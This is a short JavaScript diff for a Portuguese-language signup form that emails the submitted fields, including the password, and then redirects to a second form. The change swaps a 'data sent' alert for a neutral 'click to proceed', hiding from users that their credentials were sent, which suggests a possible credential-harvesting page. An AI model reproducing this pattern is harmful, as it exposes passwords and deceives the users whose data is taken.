@@ -28,7 +28,7 @@ document.getElementById('signup-form').addEventListener('submit', function(event
         password: password
     }).then(response => {
         console.log('Email enviado com sucesso:', response);
-        alert('Dados enviados com sucesso!');
+        alert('Clique para prosseguir!');
         window.location.href = 'formulario2.html'; // Redireciona para o formulário após o envio bem-sucedido
     }).catch(error => {
         console.error('Erro ao enviar o e-mail:', error);
